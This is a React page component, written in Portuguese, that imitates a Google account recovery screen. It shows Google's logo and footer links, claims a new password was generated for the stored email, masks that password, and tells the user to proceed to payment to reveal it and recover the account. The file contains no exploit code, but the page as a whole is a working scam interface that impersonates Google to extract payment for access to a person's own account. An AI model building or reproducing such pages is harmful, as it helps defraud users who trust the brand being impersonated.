
import React, { useEffect, useState } from 'react';
import GoogleLogo from '../components/GoogleLogo';
import RecoveryCard from '../components/RecoveryCard';
import { Lock } from 'lucide-react';
import Spinner from '../components/Spinner';

const Success = () => {
  const [email, setEmail] = useState('');

  useEffect(() => {
    const storedEmail = localStorage.getItem('recovery_email');
    if (storedEmail) {
      setEmail(storedEmail);
    }
  }, []);

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 px-4 py-12">
      <div className="mb-8 animate-fade-in">
        <GoogleLogo />
      </div>
      
      <RecoveryCard>
        <div className="flex flex-col items-center text-center">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-6 animate-scale-in">
            <Lock className="w-10 h-10 text-green-600" />
          </div>
          
          <h1 className="text-2xl font-medium text-gray-900 mb-2 animate-slide-up">Senha gerada com sucesso!</h1>
          <p className="text-gray-600 mb-8 animate-slide-up delay-100">
            Uma nova senha foi criada para <strong>{email}</strong>. Por motivos de segurança, ela está protegida.
          </p>
          
          <div className="bg-gray-50 p-4 rounded-lg border border-gray-200 w-full mb-6 animate-slide-up delay-200">
            <p className="text-sm text-gray-600">
              Senha: <span className="bg-gray-300 px-8 py-1 rounded">●●●●●●●●●●</span>
            </p>
            <p className="text-sm text-gray-500 mt-2">
              Para revelar sua senha e recuperar acesso total à sua conta, prossiga para o pagamento.
            </p>
          </div>
          
          <div className="flex justify-center items-center w-full animate-slide-up delay-300">
            <a 
              href="#" 
              className="blue-button flex items-center justify-center"
            >
              Revelar senha e acessar conta
            </a>
          </div>
        </div>
      </RecoveryCard>
      
      <div className="mt-8 flex flex-col sm:flex-row items-center justify-center text-sm text-gray-500 space-y-2 sm:space-y-0 sm:space-x-8 animate-fade-in">
        <select className="bg-transparent border-none cursor-pointer focus:outline-none">
          <option>Português (Brasil)</option>
          <option>English (United States)</option>
          <option>Español (España)</option>
        </select>
        <div className="flex space-x-8">
          <a href="#" className="hover:text-gray-700">Ajuda</a>
          <a href="#" className="hover:text-gray-700">Privacidade</a>
          <a href="#" className="hover:text-gray-700">Termos</a>
        </div>
      </div>
    </div>
  );
};

export default Success;
